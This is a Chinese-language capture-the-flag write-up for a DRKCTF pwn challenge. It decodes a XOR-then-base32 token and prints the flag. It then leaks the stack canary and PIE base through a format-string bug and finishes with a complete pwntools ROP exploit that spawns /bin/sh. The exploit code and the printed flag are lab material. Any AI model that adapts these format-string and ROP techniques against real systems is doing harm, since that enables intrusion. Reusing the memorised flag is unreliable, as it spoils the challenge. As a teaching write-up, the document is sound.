题目开了PIE和Canary保护：
<img src=".\img\屏幕截图 2024-05-23 065009.png" alt="屏幕截图 2024-05-23 065009" style="zoom: 50%;" />

先本地运行附件，观察逻辑，首先需要在2s内输入token

<img src=".\img\屏幕截图 2024-05-23 064722.png" alt="屏幕截图 2024-05-23 064722" style="zoom:50%;" />

分析代码，题目先将输入字符串在encode函数先异或0xff再进行base32加密处理，并将处理后的字符串和和“XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC”比较：

<img src=".\img\屏幕截图 2024-05-23 064451.png" alt="屏幕截图 2024-05-23 064451" style="zoom:50%;" />

此处可以打断点动态调试看内存的token，也可以直接用Cyberchef解密得到token：`DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}`

<img src=".\img\屏幕截图 2024-05-23 070232.png" alt="屏幕截图 2024-05-23 070232" style="zoom:50%;" />

使用eval计算式子

<img src=".\img\屏幕截图 2024-05-23 070532.png" alt="屏幕截图 2024-05-23 070532" style="zoom:50%;" />

根据token提示通过格式化字符串泄露Canary和PIE即可执行 `system("/bin/sh");`

<img src=".\img\屏幕截图 2024-05-23 061456.png" alt="屏幕截图 2024-05-23 061456" style="zoom:50%;" />

```py
from pwn import *

# p = remote("127.0.0.1",9999)
p = process('./attachment')
e = context.binary = ELF("./attachment")
context.update(arch='amd64', os='linux', log_level='debug')

p.recvuntil(b'token:')
payload = str('DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}')
p.sendline(payload)

p.recvline()
p.sendline(str(eval(p.recvline().decode().strip().split('=')[0].strip())))

p.recvuntil(b'gift:\n')
p.sendline(b'%13$p|%11$p|')

e.address = int(p.recvuntil(b'|').strip(b'|'), 16) - 0x2042
canary = int(p.recvuntil(b'|').strip(b'|'), 16)
log.info(f'PIE: {hex(e.address)}')
log.info(f'Canary: {hex(canary)}')

bin_sh = e.address + 0x3041
pop_rdi = e.address + 0x0000000000002072
payload = b'A' * 40
payload += p64(canary) + p64(0)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(e.plt['system'])
p.sendline(payload)
p.interactive()
```